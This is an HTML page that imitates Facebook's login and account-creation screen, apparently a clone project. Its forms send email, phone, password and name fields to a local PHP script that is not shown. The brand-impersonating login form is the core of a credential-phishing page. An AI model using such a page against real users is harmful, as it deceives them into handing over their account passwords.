<html>
	<head>
	<title>Facebook.com</title>
	<link rel="stylesheet" href="fb.css" type="text/css"/>
	<style>
		.container{	width:1350px;		padding:0px; font-family:Arial;
				margin:0px; background-color:#EDEFF6;}
		
			</style>
	</head>
	<body>
		<div class="container">

			<!-- Login Option -->
		<form action="src/main.php" method="post">
			<div class="header">
				<div>
					<h1 class="f">facebook</h1>
				</div>
				<div class="e">
					<div>
						<p class="p">Email or Phone</p>
					</div>
					<div>
						<input type="text" id="email_login" name="email_login" class="i">
					</div>
					<div class="clear"></div>
				</div>
				
				<div style="float:left;">
					<div>
						<p class="p1">Password</p>
					</div>
					<div>
						<input type="text" id="pass_login" name="pass_login" class="i1">
					</div>		
					<div class="a">
						<a href="www.facebook.com" class="a1">Forgotten account</a>
					</div>
					<div class="clear"></div>	
				</div>
				<div class="s">
					<button class="btn" id="loginbutton" name="loginbutton" type="submit">Log In</button>
				</div>
			</div>
		</form>


			<div class="clear"></div>
			<div style="background-color:#EDEFF6; float:left; margin-top:-20px; height:555px;">
				<div style="float:"left">
					<div class="body">
					<p>Facebook helps you connect and share with the people in your life.</p>	
					</div>
					<div class="body1">
					<img src="a.png"/>	
					</div>
				</div>
			</div>

		<form action="src/main.php" method="post">
			<div class="body2">
				<div class="h">
					<h1>Create an account</h1>
				</div>
				<div>
					<p style="margin:-10px 0px 1px 2px; font-size:15pt;padding-left:23px;">It's free and always will be.</p>
				</div>
				<div class="k">
					<div>
						<input type="text" placeholder="First name" id="first" name="first" class="k1">
					</div>
					<div class="k2">
						<input type="text" placeholder="Last name" id="last" name="last" class="k1">
					</div>
					<div class="clear"></div>
				</div>
				 <div style="margin:8px 0px 2px 22px;">
					<input type="email" placeholder="Mobile number or Email address" class="k3" id="email_register" name="email_register">				
				</div>
				<div style="margin:8px 0px 2px 22px;">
					<input type="password" placeholder="Password" id="pass_register" name="pass_register" class="k3">				
				</div>
				<div style="margin:4px 0px 0px 22px;">
				<p style="font-size:15pt;">Birthday</p>
				</div>
				<div style="margin:2px 0px 2px 22px; padding:0px;">
					<div style="float:left;">
						<select class="d">
						<option value="0">Day</option>
						<option value="1">1</option>
						<option value="2">2</option>
						<option value="3">3</option>
						<option value="4">4</option>
						<option value="5">5</option>
						<option value="6">6</option>
						<option value="7">7</option>
						<option value="8">8</option>
						<option value="9">9</option>
						<option value="10">10</option>
						<option value="11">11</option>
						<option value="12">12</option>
						<option value="13">13</option>
						<option value="14">14</option>
						<option value="15">15</option>
						<option value="16">16</option>
						<option value="17">17</option>
						<option value="18">18</option>
						<option value="19">19</option>
						<option value="20">20</option>
						<option value="21">21</option>
						<option value="22">22</option>
						<option value="23">23</option>
						<option value="24">24</option>
						<option value="25">25</option>
						<option value="26">26</option>
						<option value="27">27</option>
						<option value="28">28</option>
						<option value="29">29</option>
						<option value="30">30</option>
						<option value="31">31</option>
						</select>	
					</div>
					<div style="margin-left:6px; float:left;">
						<select class="d1">
						<option value="0">Month</option>
						<option value="1">Jan</option>
						<option value="2">Feb</option>
						<option value="3">Mar</option>
						<option value="4">Apr</option>
						<option value="5">May</option>
						<option value="6">Jun</option>
						<option value="7">Jul</option>
						<option value="8">Aug</option>
						<option value="9">Sep</option>
						<option value="10">Oct</option>
						<option value="11">Nov</option>
						<option value="12">Dec</option>												
						</select>
					</div>
					<div style="margin-left:6px; float:left;">
					       <select class="d2">
						<option value="0">Year</option>
						<option value="1">2018</option>
						<option value="2">2017</option>
						<option value="3">2016</option>
						<option value="4">2015</option>
						<option value="5">2014</option>
						<option value="6">2013</option>
						<option value="7">2012</option>
						<option value="8">2011</option>
						<option value="9">2010</option>
						<option value="10">2009</option>
						<option value="11">2008</option>
						<option value="12">2007</option>
						<option value="13">2006</option>
						<option value="14">2005</option>
						<option value="15">2004</option>
						<option value="16">2003</option>
						<option value="17">2002</option>
						<option value="18">2001</option>
						<option value="19">2000</option>
						<option value="20">1999</option>
						</select>
					</div> 
					<div style="margin:-12px 5px 1px 0px; float:left;">
						<a href="#" class="d3">Why do I need to provide my date of birth?</a>
					</div>
					<div class="clear"></div>
				</div>
				<div>
					<div style="margin:-10px 0px 2px 22px; float:left;">
						<p style="color:black;  font-size:15pt; padding-left:30px;">Female</p>
					</div>
					<div style="margin:-10px 0px 2px 22px; float:left;">
						<p style="color:black;  font-size:15pt; padding-left:13px;">Male</p>
					</div>
					<div class="clear"></div>
				</div>
				<div style=" margin-top:-10px;">
					<p style="font-size:8pt; padding:0px 290px 1px 20px;" >By clicking Sign Up, you agree to our <a href="#" class="m">Terms,</a> <a href="#" class="m">Data Policy</a> and <a href="#" class="m">Cookie Policy.</a> You may receive SMS notifications from us and can opt out at any time.</p>
				</div>
				<div style="margin:5px 0px 2px 22px;">
					<button type="submit" class="btn1" id="registerbutton" name="registerbutton">Sign up</button>
				</div>
				<div style="margin:35px 0px 35px 22px;">
					<p style="font-size:10pt; font-weight:bold;"><a href="#" class="m">Create a Page</a> for a celebrity, band or business.
				</div>
			</div>
		</form>

		</div>
	</body>
</html>